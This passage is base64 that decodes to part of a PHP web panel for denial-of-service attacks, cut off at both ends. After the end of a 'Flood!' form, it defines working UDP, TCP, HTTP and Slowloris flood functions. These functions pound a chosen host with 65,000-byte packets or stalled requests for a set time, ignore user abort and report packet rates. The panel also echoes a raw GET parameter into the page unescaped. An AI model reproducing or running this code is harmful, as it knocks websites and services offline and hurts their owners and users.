CAgICAgICAgICAgICAgICA8L3RhYmxlPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDxiciAvPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHN0eWxlPSJ3aWR0aDogMjAlIiB2YWx1ZT0iRmxvb2QhIiAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSInIC4gJF9HRVRbJ3R5cGUnXSAuICciPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICA8L2Zvcm0+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgPGJyIC8+PC9kaXY+JyAuICJcbiI7DQogICAgICAgICRwYWdlIC49ICcgICAgICA8L2JvZHk+JyAuICJcbiI7DQogICAgICAgICRwYWdlIC49ICc8L2h0bWw+JyAuICJcbiI7DQogDQogICAgICAgIHByaW50JHBhZ2U7DQogDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIFVEUCBGTE9PRCAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogDQogICAgICAgIGZ1bmN0aW9uIFVEUF9GbG9vZCggJGhvc3QgLCAkbGVuZ3RoICkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQoVFJVRSk7DQogICAgICAgICAgICAgICAgc2V0X3RpbWVfbGltaXQoMCk7DQogDQogICAgICAgICAgICAgICAgJG1heF90aW1lID0gdGltZSgpICsgJGxlbmd0aDsNCiANCiAgICAgICAgICAgICAgICAkcGFja2V0ID0gIiI7DQogICAgICAgICAgICAgICAgJHBhY2tldHMgPSAwOw0KIA0KICAgICAgICAgICAgICAgIHdoaWxlKCBzdHJsZW4gKCAkcGFja2V0ICkgPCA2NTAwMCApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49IENociggMjU1ICk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgd2hpbGUoIDEgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCB0aW1lKCkgPiAkbWF4X3RpbWUgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgICAgICAgICAkcmFuZCA9IHJhbmQoIDEgLCA2NTUzNSApOw0KICAgICAgICAgICAgICAgICAgICAgICAgQCRmcCA9IGZzb2Nrb3BlbiggJ3VkcDovLycuJGhvc3QsICRyYW5kLCAkZXJybm8sICRlcnJzdHIsIDUgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCAkZnAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ3cml0ZSggJGZwICwgJHBhY2tldCApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoICRmcCApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgaWYgKCAkcGFja2V0cyA9PSAwICkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gID0gJzxiPlVEUCBGbG9vZDwvYj48YnIgLz48YnIgLz4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0YWJsZSBjbGFzcz0idGV4dCI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPkhvc3Q6PC9iPjwvdGQ+PHRkPicgLiAkaG9zdCAuICc8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPkxlbmd0aDo8L2I+PC90ZD48dGQ+JyAuICRsZW5ndGggLiAnIFNlY29uZChzKTwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzwvdGFibGU+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8YnIgLz48Yj5BbiBlcnJvciBvY2N1cnJlZCEgQ291bGQgbm90IHNlbmQgcGFja2V0cy48L2I+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAgPSAnPGI+VURQIEZsb29kPC9iPjxiciAvPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRhYmxlIGNsYXNzPSJ0ZXh0Ij4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0cj48dGQ+PGI+SG9zdDo8L2I+PC90ZD48dGQ+JyAuICRob3N0IC4gJzwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0cj48dGQ+PGI+TGVuZ3RoOjwvYj48L3RkPjx0ZD4nIC4gJGxlbmd0aCAuICcgU2Vjb25kKHMpPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5QYWNrZXRzOjwvYj48L3RkPjx0ZD4nIC4gcm91bmQoJHBhY2tldHMpIC4gJyAoICcgLiByb3VuZCgkcGFja2V0cy8kbGVuZ3RoKSAuICcgcGFja2V0cy9zICk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPk1lZ2FieXRlczo8L2I+PC90ZD48dGQ+JyAuIHJvdW5kKCgkcGFja2V0cyo2NSkvMTAyNCkgLiAnICggJyAuIHJvdW5kKCgoJHBhY2tldHMqNjUpLzEwMjQpLyRsZW5ndGgpIC4gJyBNQi9zICk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8L3RhYmxlPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KIA0KICAgICAgICAgICAgICAgIHJldHVybiRydG47DQogICAgICAgICAgICAgICAgfQ0KIA0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLyBUQ1AgRkxPT0QgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIA0KICAgICAgICBmdW5jdGlvbiBUQ1BfRmxvb2QoICRob3N0ICwgJHBvcnQgLCAkbGVuZ3RoICkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQoVFJVRSk7DQogICAgICAgICAgICAgICAgc2V0X3RpbWVfbGltaXQoMCk7DQogDQogICAgICAgICAgICAgICAgJG1heF90aW1lID0gdGltZSgpICsgJGxlbmd0aDsNCiANCiAgICAgICAgICAgICAgICAkcGFja2V0ID0gIiI7DQogICAgICAgICAgICAgICAgJHBhY2tldHMgPSAwOw0KIA0KICAgICAgICAgICAgICAgIHdoaWxlKCBzdHJsZW4gKCAkcGFja2V0ICkgPCA2NTAwMCApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0IC49IENociggMjU1ICk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgQCRmcCA9IGZzb2Nrb3BlbiggJ3RjcDovLycuJGhvc3QsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDUgKTsNCiANCiAgICAgICAgICAgICAgICB3aGlsZSggMSApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIHRpbWUoKSA+ICRtYXhfdGltZSApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCAkZnAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ3cml0ZSggJGZwICwgJHBhY2tldCApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoICRmcCApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQCRmcCA9IGZzb2Nrb3BlbiggJ3RjcDovLycuJGhvc3QsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDUgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KIA0KICAgICAgICAgICAgICAgIGlmICggJHBhY2tldHMgPT0gMCApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuICA9ICc8Yj5UQ1AgRmxvb2Q8L2I+PGJyIC8+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5Ib3N0OjwvYj48L3RkPjx0ZD4nIC4gJGhvc3QgLiAnPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5Qb3J0OjwvYj48L3RkPjx0ZD4nIC4gJHBvcnQgLiAnPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5MZW5ndGg6PC9iPjwvdGQ+PHRkPicgLiAkbGVuZ3RoIC4gJyBTZWNvbmQocyk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8L3RhYmxlPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPGJyIC8+PGI+QW4gZXJyb3Igb2NjdXJyZWQhIENvdWxkIG5vdCBzZW5kIHBhY2tldHMuPC9iPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gID0gJzxiPlRDUCBGbG9vZDwvYj48YnIgLz48YnIgLz4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0YWJsZSBjbGFzcz0idGV4dCI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPkhvc3Q6PC9iPjwvdGQ+PHRkPicgLiAkaG9zdCAuICc8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPlBvcnQ6PC9iPjwvdGQ+PHRkPicgLiAkcG9ydCAuICc8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dHI+PHRkPjxiPkxlbmd0aDo8L2I+PC90ZD48dGQ+JyAuICRsZW5ndGggLiAnIFNlY29uZChzKTwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0cj48dGQ+PGI+UGFja2V0czo8L2I+PC90ZD48dGQ+JyAuIHJvdW5kKCRwYWNrZXRzKSAuICcgKCAnIC4gcm91bmQoJHBhY2tldHMvJGxlbmd0aCkgLiAnIHBhY2tldHMvcyApPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5NZWdhYnl0ZXM6PC9iPjwvdGQ+PHRkPicgLiByb3VuZCgoJHBhY2tldHMqNjUpLzEwMjQpIC4gJyAoICcgLiByb3VuZCgoKCRwYWNrZXRzKjY1KS8xMDI0KS8kbGVuZ3RoKSAuICcgTUIvcyApPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPC90YWJsZT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICByZXR1cm4kcnRuOw0KICAgICAgICAgICAgICAgIH0NCiANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gSFRUUCBGTE9PRCAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCiANCiAgICAgICAgZnVuY3Rpb24gSFRUUF9GbG9vZCggJGhvc3QgLCAkcGFnZSAsICRsZW5ndGggKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZ25vcmVfdXNlcl9hYm9ydChUUlVFKTsNCiAgICAgICAgICAgICAgICBzZXRfdGltZV9saW1pdCgwKTsNCiANCiAgICAgICAgICAgICAgICBpZiAoICRwYWdlID09ICcnICkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlID0gJy8nOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KIA0KICAgICAgICAgICAgICAgICRtYXhfdGltZSA9IHRpbWUoKSArICRsZW5ndGg7DQogDQogICAgICAgICAgICAgICAgJHBhY2tldCAuPSAnR0VUICcgLiAkcGFnZSAuICcgSFRUUC8xLjEnIC4gIlxyXG4iOw0KICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gJ0hvc3Q6ICcgLiAkaG9zdCAuICJcclxuIjsNCiAgICAgICAgICAgICAgICAkcGFja2V0IC49ICdVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IHJ2OjIuMGI3KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQuMGI3JyAuICJcclxuIjsNCiAgICAgICAgICAgICAgICAkcGFja2V0IC49ICdLZWVwLWFsaXZlOiAzMDAnIC4gIlxyXG4iOw0KICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gJ0Nvbm5lY3Rpb246IGtlZXAtYWxpdmUnIC4gIlxyXG5cclxuIjsNCiANCiAgICAgICAgICAgICAgICBAJGZwID0gZnNvY2tvcGVuKCAkaG9zdCwgODAsICRlcnJubywgJGVycnN0ciwgNSApOw0KICAgICAgICAgICAgICAgIHdoaWxlKCAxICkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICggdGltZSgpID4gJG1heF90aW1lICkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoICRmcCApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCAkZnAgLCAkcGFja2V0ICk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZjbG9zZSggJGZwICk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBAJGZwID0gZnNvY2tvcGVuKCAkaG9zdCwgODAsICRlcnJubywgJGVycnN0ciwgNSApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgaWYgKCAkcGFja2V0cyA9PSAwICkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gID0gJzxiPkhUVFAgRmxvb2Q8L2I+PGJyIC8+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5Ib3N0OjwvYj48L3RkPjx0ZD4nIC4gJGhvc3QgLiAnPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5MZW5ndGg6PC9iPjwvdGQ+PHRkPicgLiAkbGVuZ3RoIC4gJyBTZWNvbmQocyk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8L3RhYmxlPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPGJyIC8+PGI+QW4gZXJyb3Igb2NjdXJyZWQhIENvdWxkIG5vdCBzZW5kIHBhY2tldHMuPC9iPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gID0gJzxiPkhUVFAgRmxvb2Q8L2I+PGJyIC8+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5Ib3N0OjwvYj48L3RkPjx0ZD4nIC4gJGhvc3QgLiAnPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5MZW5ndGg6PC9iPjwvdGQ+PHRkPicgLiAkbGVuZ3RoIC4gJyBTZWNvbmQocyk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8Yj5QYWNrZXRzOjwvYj4gJyAuIHJvdW5kKCRwYWNrZXRzKSAuICcgKCAnIC4gcm91bmQoJHBhY2tldHMvJGxlbmd0aCkgLiAnIHBhY2tldHMvcyApIDxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPC90YWJsZT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICByZXR1cm4kcnRuOw0KICAgICAgICAgICAgICAgIH0NCiANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gU0xPV0xPUklTIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIA0KICAgICAgICBmdW5jdGlvbiBTTE9XTE9SSVMoICRob3N0ICwgJHBhZ2UgLCAkbGVuZ3RoICkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWdub3JlX3VzZXJfYWJvcnQoVFJVRSk7DQogICAgICAgICAgICAgICAgc2V0X3RpbWVfbGltaXQoMCk7DQogDQogICAgICAgICAgICAgICAgaWYgKCAkcGFnZSA9PSAnJyApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSA9ICcvJzsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICAkbWF4X3RpbWUgPSB0aW1lKCkgKyAkbGVuZ3RoOw0KIA0KICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gJ1BPU1QgJyAuICRwYWdlIC4gJyBIVFRQLzEuMScgLiAiXHJcbiI7DQogICAgICAgICAgICAgICAgJHBhY2tldCAuPSAnSG9zdDogJyAuICRob3N0IC4gIlxyXG4iOw0KICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gJ1VzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6Mi4wYjcpIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNC4wYjcnIC4gIlxyXG4iOw0KICAgICAgICAgICAgICAgICRwYWNrZXQgLj0gJ0NvbnRlbnQtbGVuZ3RoOiA0MicgLiAiXHJcblxyXG4iOw0KIA0KICAgICAgICAgICAgICAgIEAkZnAgPSBmc29ja29wZW4oICRob3N0LCA4MCwgJGVycm5vLCAkZXJyc3RyLCA1ICk7DQogICAgICAgICAgICAgICAgd2hpbGUoIDEgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCB0aW1lKCkgPiAkbWF4X3RpbWUgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogDQogICAgICAgICAgICAgICAgICAgICAgICBpZiggJGZwICkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUoICRmcCAsICRwYWNrZXQgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCAkZnAgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldHMrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEAkZnAgPSBmc29ja29wZW4oICRob3N0LCA4MCwgJGVycm5vLCAkZXJyc3RyLCA1ICk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICBpZiAoICRwYWNrZXRzID09IDAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAgPSAnPGI+U2xvd2xvcmlzPC9iPjxiciAvPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRhYmxlIGNsYXNzPSJ0ZXh0Ij4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0cj48dGQ+PGI+SG9zdDo8L2I+PC90ZD48dGQ+JyAuICRob3N0IC4gJzwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzx0cj48dGQ+PGI+TGVuZ3RoOjwvYj48L3RkPjx0ZD4nIC4gJGxlbmd0aCAuICcgU2Vjb25kKHMpPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPC90YWJsZT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICRydG4gLj0gJzxiciAvPjxiPkFuIGVycm9yIG9jY3VycmVkISBDb3VsZCBub3Qgc2VuZCBwYWNrZXRzLjwvYj48YnIgLz4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuICA9ICc8Yj5TbG93bG9yaXM8L2I+PGJyIC8+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5Ib3N0OjwvYj48L3RkPjx0ZD4nIC4gJGhvc3QgLiAnPC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPHRyPjx0ZD48Yj5MZW5ndGg6PC9iPjwvdGQ+PHRkPicgLiAkbGVuZ3RoIC4gJyBTZWNvbmQocyk8L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAkcnRuIC49ICc8Yj5QYWNrZXRzOjwvYj4gJyAuIHJvdW5kKCRwYWNrZXRzKSAuICcgKCAnIC4gcm91bmQoJHBhY2tldHMvJGxlbmd0aCkgLiAnIHBhY2tldHMvcyApIDxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHJ0biAuPSAnPC90YWJsZT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiANCiAgICAgICAgICAgICAgICByZXR1cm4kcnRuOw0KICAgICAgICAgICA